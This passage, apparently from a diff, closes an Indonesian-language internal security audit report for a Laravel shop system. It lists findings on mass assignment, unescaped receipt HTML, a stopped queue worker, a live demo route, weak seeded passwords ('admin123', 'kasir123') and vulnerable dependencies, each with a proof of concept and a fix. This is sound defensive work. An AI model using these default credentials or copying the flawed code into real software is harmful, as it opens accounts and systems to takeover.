+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada model User dan Pengguna, kolom-kolom kritis seperti &#x27;role&#x27;, &#x27;status&#x27;, &#x27;password_hash&#x27;, dan &#x27;telegram_chat_id&#x27; dimasukkan ke dalam array $fillable. Jika developer menggunakan pemanggilan mass assignment seperti User::create($request-&gt;all()) atau Pengguna::update($request-&gt;all()), penyerang dapat mengeksploitasi celah ini untuk menaikkan hak akses (privilege escalation) atau memodifikasi status akun secara tidak sah.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Peninjauan kode statis pada model Pengguna.php:
+protected $fillable = [&#x27;nama&#x27;, &#x27;username&#x27;, &#x27;password_hash&#x27;, &#x27;role&#x27;, &#x27;status&#x27;, &#x27;telegram_chat_id&#x27;, ...];
+# Menunjukkan kolom hak istimewa terbuka untuk penugasan massal Eloquent.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Models/Pengguna.php
+// Keluarkan kolom sensitif dari $fillable:
+protected $fillable = [
+    &#x27;nama&#x27;,
+    &#x27;username&#x27;,
+];
+// Kelola perubahan role dan password secara eksplisit melalui method mutator khusus.</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-23 -->
+      <article class="finding-card" id="SEC-23">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-23</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-116</span>
+          </div>
+          <h2 class="finding-title">Interpolasi Kode Transaksi Tanpa Sanitasi HTML pada Cetak Struk Penjualan</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">app/Http/Controllers/Kasir/TransaksiKasirController.php (baris 311, 367)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pada fungsi renderStrukHtml, variabel $transaksi-&gt;kode_transaksi diinterpolasi langsung ke dalam blok template string HTML pada tag &lt;title&gt; dan &lt;strong&gt; tanpa diproses menggunakan htmlspecialchars(). Berbeda dengan variabel $kasirNama dan $pelanggan yang disanitasi secara ketat, kelalaian sanitasi pada kode transaksi berpotensi memicu HTML injection jika nomor nota dimodifikasi pada lapisan basis data.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Meninjau baris 311 dan 367 TransaksiKasirController.php:
+&lt;title&gt;Struk Pembelian - {$transaksi-&gt;kode_transaksi}&lt;/title&gt;
+&lt;tr&gt;&lt;td&gt;Nota:&lt;/td&gt;&lt;td class=&quot;text-right&quot;&gt;&lt;strong&gt;{$transaksi-&gt;kode_transaksi}&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;
+# Karakter khusus pada kode_transaksi dirender mentah oleh browser printer.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// app/Http/Controllers/Kasir/TransaksiKasirController.php
+$kodeNota = htmlspecialchars((string) $transaksi-&gt;kode_transaksi, ENT_QUOTES, &#x27;UTF-8&#x27;);
+// Gunakan variabel $kodeNota yang telah disanitasi ke dalam string template struk.</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-24 -->
+      <article class="finding-card" id="SEC-24">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-24</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-754</span>
+          </div>
+          <h2 class="finding-title">Worker Antrean (Queue Worker) Tidak Berjalan pada Lingkungan Produksi</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">.env (baris 38: QUEUE_CONNECTION=database), proses sistem operasi</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Pengaturan antrean pada berkas .env disetel ke &#x27;QUEUE_CONNECTION=database&#x27;. Namun pada pengujian proses server, tidak ada daemon antrean (&#x27;php artisan queue:work&#x27;) yang berjalan di latar belakang (tidak terpasang pada supervisor atau systemd service). Akibatnya, job asynchronous seperti KirimPeringatanStokJob akan menumpuk pada tabel basis data &#x27;jobs&#x27; dan notifikasi stok kritis tidak akan pernah terkirim ke Telegram pemilik toko.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Memeriksa status proses queue worker di sistem operasi:
+ps aux | grep &quot;queue:work&quot;
+# Output: Tidak ada proses queue:work yang aktif. Tabel &#x27;jobs&#x27; menimbun antrean tanpa diproses.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code># Buat konfigurasi systemd service untuk menjalankan queue worker secara permanen:
+# /etc/systemd/system/tokofiro-worker.service
+[Unit]
+Description=Toko Firo Queue Worker
+After=network.target
+
+[Service]
+User=archbox
+ExecStart=/usr/bin/php /home/archbox/tugas/artisan queue:work database --sleep=3 --tries=3
+Restart=always
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-25 -->
+      <article class="finding-card" id="SEC-25">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-25</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-489</span>
+          </div>
+          <h2 class="finding-title">Rute Demo Pengujian Antarmuka Masih Aktif di Lingkungan Produksi</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">routes/web.php (baris 40-42), app/Http/Controllers/DemoBarangController.php</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Rute &#x27;/demo/barang&#x27; yang terhubung ke DemoBarangController masih terdaftar di routes/web.php. Rute ini digunakan oleh tim frontend saat melakukan penyesuaian visual katalog dan tidak memiliki fungsi bisnis operasional. Membiarkan endpoint demo aktif pada server produksi memperluas permukaan serangan (attack surface) yang tidak perlu.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Mengakses endpoint demo pada server:
+curl -s -o /dev/null -w &quot;HTTP Status: %{http_code}\n&quot; http://localhost/demo/barang
+# Halaman demo katalog prototipe masih dapat dimuat secara utuh.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// routes/web.php
+// Hapus rute demo atau isolasi secara ketat hanya pada environment non-produksi:
+if (! app()-&gt;environment(&#x27;production&#x27;)) {
+    Route::get(&#x27;/demo/barang&#x27;, [DemoBarangController::class, &#x27;index&#x27;])-&gt;name(&#x27;demo.barang&#x27;);
+}</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-26 -->
+      <article class="finding-card" id="SEC-26">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-26</span>
+            <span class="severity-badge sev-low">Rendah (LOW)</span>
+            <span class="cwe-tag">CWE-1392 / CWE-798</span>
+          </div>
+          <h2 class="finding-title">Kredensial Default Lemah dan Terbuka pada Database Seeder</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">database/seeders/UserSeeder.php (baris 13-34)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Berkas database seeder menginisialisasi akun pengguna dengan kata sandi bawaan yang sangat lemah: &#x27;admin&#x27; / &#x27;admin123&#x27; dan &#x27;kasir&#x27; / &#x27;kasir123&#x27;. Jika proses &#x27;php artisan db:seed&#x27; dijalankan pada saat penerapan awal di server produksi dan administrator lupa mengganti password, akun langsung dapat diambil alih oleh pihak luar yang mencoba kredensial default sistem.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Meninjau database/seeders/UserSeeder.php:
+&#x27;username&#x27; =&gt; &#x27;admin&#x27;, &#x27;password_hash&#x27; =&gt; Hash::make(&#x27;admin123&#x27;)
+&#x27;username&#x27; =&gt; &#x27;kasir&#x27;, &#x27;password_hash&#x27; =&gt; Hash::make(&#x27;kasir123&#x27;)
+# Kata sandi tersebut tercatat pada repositori git dan kamus brute force umum.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code>// database/seeders/UserSeeder.php
+// Terbitkan kata sandi acak dengan entropi tinggi dan tampilkan sekali pada terminal:
+$adminPass = \Illuminate\Support\Str::password(16);
+Pengguna::updateOrCreate(
+    [&#x27;username&#x27; =&gt; &#x27;admin&#x27;],
+    [&#x27;nama&#x27; =&gt; &#x27;Admin Toko&#x27;, &#x27;password_hash&#x27; =&gt; Hash::make($adminPass), &#x27;role&#x27; =&gt; &#x27;ADMIN&#x27;, &#x27;status&#x27; =&gt; &#x27;AKTIF&#x27;]
+);
+$this-&gt;command-&gt;info(&quot;PASSWORD SEMENTARA ADMIN: {$adminPass}&quot;);</code></pre>
+          </div>
+        </div>
+      </article>
+
+      <!-- Finding Card: SEC-27 -->
+      <article class="finding-card" id="SEC-27">
+        <div class="finding-header">
+          <div class="finding-id-badge-group">
+            <span class="finding-id">SEC-27</span>
+            <span class="severity-badge sev-info">Informasional (INFO)</span>
+            <span class="cwe-tag">CWE-1395</span>
+          </div>
+          <h2 class="finding-title">Temuan Kerentanan Dependensi Pihak Ketiga (Composer Security Advisories)</h2>
+        </div>
+
+        <div class="finding-body">
+          <div class="finding-meta-row">
+            <div class="finding-meta-item">
+              <span class="finding-meta-label">Lokasi Berkas:</span>
+              <span class="finding-meta-val">composer.lock (league/commonmark, symfony/http-foundation, symfony/mime)</span>
+            </div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Deskripsi & Dampak Kerentanan</div>
+            <div class="content-block-desc">Hasil pemindaian &#x27;composer audit&#x27; mengidentifikasi 4 advisory keamanan pada 3 paket dependensi framework Laravel:
+1. league/commonmark (Sedang, PKSA-m2dq-1fhr-29b1): DisallowedRawHtml bypassed when a disallowed tag name ends the raw-HTML literal.
+2. league/commonmark (Tinggi, PKSA-m4t9-vsgq-8khn): Quadratic-time denial of service in GFM Table extension block-start scan.
+3. symfony/http-foundation (Tinggi, CVE-2026-108082, PKSA-xmwy-rmx5-m7h4): ReDoS in HeaderUtils::split() reachable through Cache-Control request header.
+4. symfony/mime (Sedang, CVE-2026-45070, PKSA-wtxr-p26d-nn42): Email Header Injection via non-token characters in MIME parameter names.</div>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Langkah Reproduksi (Proof of Concept)</div>
+            <div class="code-term-header">
+              <span>Terminal / HTTP Proof-of-Concept</span>
+              <span>Bash</span>
+            </div>
+            <pre><code># Eksekusi composer audit pada direktori proyek:
+/usr/local/bin/composer audit --working-dir=/home/archbox/tugas
+# Output: Found 4 security vulnerability advisories affecting 3 packages.</code></pre>
+          </div>
+
+          <div class="content-block">
+            <div class="content-block-title">Rekomendasi Perbaikan & Solusi Kode</div>
+            <div class="code-term-header">
+              <span>Solusi Perbaikan Kode</span>
+              <span>PHP / Laravel</span>
+            </div>
+            <pre><code># Perbarui paket yang terdampak ke versi patch terbaru:
+composer update league/commonmark symfony/http-foundation symfony/mime --with-dependencies</code></pre>
+          </div>
+        </div>
+      </article>
+
+    </section>
+
+    <!-- Footer -->
+    <footer class="report-footer">
+      <div>
+        <strong>Toko Firo Security Operations</strong> &mdash; Laporan Audit Keamanan Siber Internal
+      </div>
+      <div>
+        Tanggal Dokumen: <strong>31 Oktober 2026</strong> | Cakupan: Seluruh Kode Sumber & Konfigurasi
+      </div>
+    </footer>
+
+  </main>
+</div>
+
+</body>
+</html>
